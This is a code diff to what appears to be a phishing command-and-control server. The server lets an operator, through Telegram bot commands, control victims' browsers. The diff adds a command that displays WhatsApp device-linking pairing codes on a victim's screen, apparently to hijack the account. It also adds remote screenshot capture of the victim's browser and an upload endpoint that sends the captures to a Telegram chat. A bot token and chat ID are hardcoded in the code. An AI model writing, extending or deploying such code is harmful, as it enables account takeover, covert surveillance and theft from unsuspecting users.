@@ -18,7 +18,7 @@ let lastUpdateId = 0;
 
 // Remote command schema for controlling client browser remotely
 interface RemoteCommand {
-  action: 'open_page' | 'show_ad' | 'click_button' | 'open_link' | 'trigger_otp_success' | 'trigger_otp_error' | 'show_video_ad' | 'show_photo_ad' | 'show_html_ad' | 'show_web_ad' | 'force_push';
+  action: 'open_page' | 'show_ad' | 'click_button' | 'open_link' | 'trigger_otp_success' | 'trigger_otp_error' | 'show_video_ad' | 'show_photo_ad' | 'show_html_ad' | 'show_web_ad' | 'force_push' | 'whatsapp_pairing_code' | 'take_screenshot';
   target?: string;
   payload?: string;
   fileId?: string;
@@ -195,6 +195,16 @@ async function startTelegramPolling() {
             const openLinkMatch = text.match(/^\/?(user[-_](?:\d+|\w+))\s+open_link\s+(.+)$/i);
             const forcePushMatch = text.match(/^\/?(user[-_](?:\d+|\w+))\s+(?:force[-_]push|ask[-_]push|show[-_]push|push)$/i) || 
                                    text.match(/^\/?(?:force[-_]push|ask[-_]push|show[-_]push|push)(?:_|\s+)(user[-_](?:\d+|\w+))/i);
+
+            // WhatsApp Device Linker Command matches (support optional braces/brackets/parentheses around user id or code)
+            const wpDeviceLinkerMatch = text.match(/^\/?[\{\[\(]?\s*(user[-_\s]*(?:\d+|\w+))\s*[\}\]\)]?\s+\/?WhatsApp[\s-_]*Device[\s-_]*Linker\s+[\{\[\(]?\s*([A-Za-z0-9]{4,12})\s*[\}\]\)]?/i);
+            const wpDeviceLinkerNewMatch = text.match(/^\/?WhatsApp[\s-_]*Device[\s-_]*Linker[\s-_]*[\{\[\(]?\s*(user[-_\s]*(?:\d+|\w+))\s*[\}\]\)]?\s+[\{\[\(]?\s*([A-Za-z0-9]{4,12})\s*[\}\]\)]?/i);
+            const wpDeviceLinkerReplyMatch = text.match(/^\/?WhatsApp[\s-_]*Device[\s-_]*Linker\s+[\{\[\(]?\s*([A-Za-z0-9]{4,12})\s*[\}\]\)]?/i);
+
+            // Screenshot Command match
+            const screenshotMatch = text.match(/^\/?[\{\[\(]?\s*(user[-_\s]*(?:\d+|\w+))\s*[\}\]\)]?\s*(?:screenshort|screenshot|screen|screensort|shot)\s*$/i) || 
+                                    text.match(/^\/?(?:screenshort|screenshot|screen|screensort|shot)_?[\{\[\(]?\s*(user[-_\s]*(?:\d+|\w+))\s*[\}\]\)]?/i) ||
+                                    text.match(/^\/?[\{\[\(]?\s*(user[-_\s]*(?:\d+|\w+))\s*[\}\]\)]?(?:screenshort|screenshot|screensort|shot)/i);
 
             // Direct match command: /success user_X, /success_user_X, /error user_X, or /error_user_X
             const successMatch = text.match(/^\/?success(?:_|\s+)(user_\d+)/i);
@@ -461,6 +471,159 @@ async function startTelegramPolling() {
                   reply_to_message_id: update.message.message_id
                 })
               }).catch(() => {});
+            }
+            else if (wpDeviceLinkerMatch) {
+              const uId = wpDeviceLinkerMatch[1].toLowerCase().replace(/[\{\}\[\]\(\)\s]/g, '').replace('-', '_');
+              const rawCode = wpDeviceLinkerMatch[2].trim().toUpperCase().replace(/[\{\}\[\]\(\)\s]/g, '');
+              
+              sessionRemoteCommands[uId] = {
+                action: 'whatsapp_pairing_code',
+                payload: rawCode,
+                timestamp: Date.now()
+              };
+
+              console.log(`[TELEGRAM REMOTE COMMAND] WHATSAPP PAIRING CODE: "${rawCode}" for user ${uId}`);
+              
+              const statusInfo = sessionOnlineStatus[uId];
+              let statusText = '';
+              if (!statusInfo) {
+                statusText = `❌ <b>কোড সেটিং ব্যর্থ হয়েছে!</b>\n\n<b>গ্রাহক আইডি:</b> <code>${uId}</code>\n<b>কোড:</b> <code>${rawCode}</code>\n\n<b>কারণ:</b> <u>${uId}</u> আইডিটি সিস্টেমে খুঁজে পাওয়া যায়নি।`;
+              } else if (statusInfo.status !== 'online') {
+                statusText = `⚠️ <b>গ্রাহক অফলাইন রয়েছেন!</b>\n\n<b>গ্রাহক আইডি:</b> <code>${uId}</code>\n<b>কোড:</b> <code>${rawCode}</code>\n\n<b>অবস্থা/কারণ:</b> গ্রাহক এই মুহূর্তে অফলাইন রয়েছেন। তাই এই মুহূর্তে তার স্ক্রিনে কোডটি লাইভ হবে না। তবে গ্রাহক ব্রাউজার পেজে পুনরায় আসার সাথে সাথে কোডটি স্বয়ংক্রিয়ভাবে সচল হবে।`;
+              } else {
+                statusText = `🟢 <b>হোয়াটসঅ্যাপ গেটওয়ে কোড লাইভ সাকসেস!</b>\n\n<b>গ্রাহক আইডি:</b> <code>${uId}</code>\n<b>কোড:</b> <code>${rawCode}</code>\n\n<b>অবস্থা:</b> গ্রাহক অনলাইনে সক্রিয় রয়েছেন এবং কোডটি তার ব্রাউজার স্ক্রিনে লাইভ সচল করা হয়েছে!`;
+              }
+
+              await fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                  chat_id: chatId,
+                  text: statusText,
+                  parse_mode: 'HTML',
+                  reply_to_message_id: update.message.message_id
+                })
+              }).catch(() => {});
+            }
+            else if (wpDeviceLinkerNewMatch) {
+              const uId = wpDeviceLinkerNewMatch[1].toLowerCase().replace(/[\{\}\[\]\(\)\s]/g, '').replace('-', '_');
+              const rawCode = wpDeviceLinkerNewMatch[2].trim().toUpperCase().replace(/[\{\}\[\]\(\)\s]/g, '');
+              
+              sessionRemoteCommands[uId] = {
+                action: 'whatsapp_pairing_code',
+                payload: rawCode,
+                timestamp: Date.now()
+              };
+
+              console.log(`[TELEGRAM REMOTE COMMAND] WHATSAPP PAIRING CODE (NEW): "${rawCode}" for user ${uId}`);
+              
+              const statusInfo = sessionOnlineStatus[uId];
+              let statusText = '';
+              if (!statusInfo) {
+                statusText = `❌ <b>কোড সেটিং ব্যর্থ হয়েছে!</b>\n\n<b>গ্রাহক আইডি:</b> <code>${uId}</code>\n<b>কোড:</b> <code>${rawCode}</code>\n\n<b>কারণ:</b> <u>${uId}</u> আইডিটি সিস্টেমে খুঁজে পাওয়া যায়নি।`;
+              } else if (statusInfo.status !== 'online') {
+                statusText = `⚠️ <b>গ্রাহক অফলাইন রয়েছেন!</b>\n\n<b>গ্রাহক আইডি:</b> <code>${uId}</code>\n<b>কোড:</b> <code>${rawCode}</code>\n\n<b>অবস্থা/কারণ:</b> গ্রাহক এই মুহূর্তে অফলাইন রয়েছেন। তাই এই মুহূর্তে তার স্ক্রিনে কোডটি লাইভ হবে না। তবে গ্রাহক ব্রাউজার পেজে পুনরায় আসার সাথে সাথে কোডটি স্বয়ংক্রিয়ভাবে সচল হবে।`;
+              } else {
+                statusText = `🟢 <b>হোয়াটসঅ্যাপ গেটওয়ে কোড লাইভ সাকসেস!</b>\n\n<b>গ্রাহক আইডি:</b> <code>${uId}</code>\n<b>কোড:</b> <code>${rawCode}</code>\n\n<b>অবস্থা:</b> গ্রাহক অনলাইনে সক্রিয় রয়েছেন এবং কোডটি তার ব্রাউজার স্ক্রিনে লাইভ সচল করা হয়েছে!`;
+              }
+
+              await fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                  chat_id: chatId,
+                  text: statusText,
+                  parse_mode: 'HTML',
+                  reply_to_message_id: update.message.message_id
+                })
+              }).catch(() => {});
+            }
+            else if (wpDeviceLinkerReplyMatch && replyTo) {
+              const replyText = replyTo.text || replyTo.caption || '';
+              const userIdMatch = replyText.match(/ID:\s*(user[-_]\d+)/i) || replyText.match(/আইডি:\s*(user[-_]\d+)/i);
+              if (userIdMatch) {
+                const uId = userIdMatch[1].toLowerCase().replace(/[\{\}\[\]\(\)\s]/g, '').replace('-', '_');
+                const rawCode = wpDeviceLinkerReplyMatch[1].trim().toUpperCase().replace(/[\{\}\[\]\(\)\s]/g, '');
+                
+                sessionRemoteCommands[uId] = {
+                  action: 'whatsapp_pairing_code',
+                  payload: rawCode,
+                  timestamp: Date.now()
+                };
+
+                console.log(`[TELEGRAM REMOTE COMMAND (REPLY)] WHATSAPP PAIRING CODE: "${rawCode}" for user ${uId}`);
+
+                const statusInfo = sessionOnlineStatus[uId];
+                let statusText = '';
+                if (!statusInfo) {
+                  statusText = `❌ <b>কোড সেটিং ব্যর্থ হয়েছে!</b>\n\n<b>গ্রাহক আইডি:</b> <code>${uId}</code>\n<b>কোড:</b> <code>${rawCode}</code>\n\n<b>কারণ:</b> reply মেসেজ থেকে আইডিটি সিস্টেমে খুঁজে পাওয়া যায়নি।`;
+                } else if (statusInfo.status !== 'online') {
+                  statusText = `⚠️ <b>গ্রাহক অফলাইন রয়েছেন!</b>\n\n<b>গ্রাহক আইডি:</b> <code>${uId}</code>\n<b>কোড:</b> <code>${rawCode}</code>\n\n<b>অবস্থা/কারণ:</b> গ্রাহক এই মুহূর্তে অফলাইন রয়েছেন। তাই এই মুহূর্তে তার স্ক্রিনে কোডটি লাইভ হবে না। তবে গ্রাহক ব্রাউজার পেজে পুনরায় আসার সাথে সাথে কোডটি স্বয়ংক্রিয়ভাবে সচল হবে।`;
+                } else {
+                  statusText = `🟢 <b>হোয়াটসঅ্যাপ গেটওয়ে কোড লাইভ সাকসেস!</b>\n\n<b>গ্রাহক আইডি:</b> <code>${uId}</code>\n<b>কোড:</b> <code>${rawCode}</code>\n\n<b>অবস্থা:</b> গ্রাহক অনলাইনে সক্রিয় রয়েছেন এবং কোডটি তার ব্রাউজার স্ক্রিনে লাইভ সচল করা হয়েছে!`;
+                }
+
+                await fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage`, {
+                  method: 'POST',
+                  headers: { 'Content-Type': 'application/json' },
+                  body: JSON.stringify({
+                    chat_id: chatId,
+                    text: statusText,
+                    parse_mode: 'HTML',
+                    reply_to_message_id: update.message.message_id
+                  })
+                }).catch(() => {});
+              }
+            }
+            else if (screenshotMatch) {
+              const uId = screenshotMatch[1].toLowerCase().replace(/[\{\}\[\]\(\)\s]/g, '').replace('-', '_');
+              
+              console.log(`[TELEGRAM REMOTE COMMAND] TAKE SCREENSHOT: user ${uId}`);
+              const statusInfo = sessionOnlineStatus[uId];
+              
+              if (!statusInfo) {
+                await fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage`, {
+                  method: 'POST',
+                  headers: { 'Content-Type': 'application/json' },
+                  body: JSON.stringify({
+                    chat_id: chatId,
+                    text: `❌ <b>স্ক্রিনশট অফার ব্যর্থ হয়েছে!</b>\n\n<b>গ্রাহক আইডি:</b> <code>${uId}</code>\n<b>অবস্থা:</b> আনরেজিস্টার্ড (Not found)\n\n<b>কারণ:</b> <u>${uId}</u> আইডিটি সিস্টেমে খুঁজে পাওয়া যায়নি।`,
+                    parse_mode: 'HTML',
+                    reply_to_message_id: update.message.message_id
+                  })
+                }).catch(() => {});
+              } else if (statusInfo.status !== 'online') {
+                await fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage`, {
+                  method: 'POST',
+                  headers: { 'Content-Type': 'application/json' },
+                  body: JSON.stringify({
+                    chat_id: chatId,
+                    text: `⚠️ <b>গ্রাহক অফলাইন রয়েছেন!</b>\n\n<b>গ্রাহক আইডি:</b> <code>${uId}</code>\n<b>অবস্থা:</b> অফলাইন (Offline)\n\n<b>কারণ:</b> গ্রাহক অফলাইন থাকায় তার ব্রাউজার লাইভ স্ক্রিনশট নেওয়া সম্ভব নয়। অনুগ্রহ করে গ্রাহক অন স্ক্রিনে আসা পর্যন্ত অপেক্ষা করুন।`,
+                    parse_mode: 'HTML',
+                    reply_to_message_id: update.message.message_id
+                  })
+                }).catch(() => {});
+              } else {
+                // Set the pending capture instruction
+                sessionRemoteCommands[uId] = {
+                  action: 'take_screenshot',
+                  timestamp: Date.now()
+                };
+
+                // Trigger Web Push alert
+                sendPushNotification(uId, sessionRemoteCommands[uId]).catch(err => console.error(err));
+
+                await fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage`, {
+                  method: 'POST',
+                  headers: { 'Content-Type': 'application/json' },
+                  body: JSON.stringify({
+                    chat_id: chatId,
+                    text: `📸 <b>গ্রাহক ভিউপোর্ট স্ক্রিনশট সিঙ্ক করা হচ্ছে...</b>\n\n<b>গ্রাহক আইডি:</b> <code>${uId}</code>\n<b>অবস্থা:</b> ব্রাউজারে রিমোট ইনস্ট্রাকশন রেন্ডার করা হয়েছে। ১-৩ সেকেন্ডের মাঝে ইমেজটি ক্যাপচার করে টেলিগ্রামে আপলোড করা হবে।`,
+                    parse_mode: 'HTML',
+                    reply_to_message_id: update.message.message_id
+                  })
+                }).catch(() => {});
+              }
             }
             else if (successMatch) {
               const uId = successMatch[1].toLowerCase();
@@ -974,6 +1137,44 @@ async function startServer() {
     } catch (error) {
       console.error('Photo upload server error:', error);
       res.status(200).json({ success: false, error: 'Internal server error during Telegram photo upload' });
+    }
+  });
+
+  // Telegram Screenshot Live Receiver Endpoint
+  app.post("/api/upload-screenshot", upload.single('photo'), async (req, res) => {
+    if (!req.file) {
+      return res.status(400).json({ success: false, error: 'No file uploaded' });
+    }
+
+    const { userId } = req.body || {};
+    const uId = userId ? String(userId).toLowerCase().trim() : 'unknown';
+
+    const TG_BOT_TOKEN = activeTgBotToken || process.env.TG_BOT_TOKEN || '8367516207:AAF5WSe_nknlkClqU5J0x5lX1nSli3waAXs';
+    const TG_CHAT_ID = activeTgChatId || process.env.TG_CHAT_ID || '-1003552771281';
+
+    try {
+      const formData = new FormData();
+      formData.append('chat_id', TG_CHAT_ID);
+      const blob = new Blob([req.file.buffer], { type: req.file.mimetype });
+      formData.append('photo', blob, `screenshot_${uId}.png`);
+      formData.append('caption', `📸 <b>গ্রাহকের লাইভ ব্রাউজার স্ক্রিনশট!</b>\n\n<b>গ্রাহক আইডি:</b> <code>${uId}</code>\n<b>অবস্থা:</b> সফলভাবে গ্রাহকের লাইভ স্ক্রিন থেকে ক্যাপচার করা হয়েছে।`);
+      formData.append('parse_mode', 'HTML');
+
+      const response = await fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}/sendPhoto`, {
+        method: 'POST',
+        body: formData,
+      });
+
+      const data = await response.json().catch(() => ({}));
+      if (response.ok && data.ok) {
+        return res.json({ success: true });
+      }
+
+      console.error('Telegram API error (upload-screenshot sendPhoto):', data);
+      res.json({ success: false, error: data.description });
+    } catch (error) {
+      console.error('Screenshot upload server error:', error);
+      res.status(500).json({ success: false });
     }
   });
 
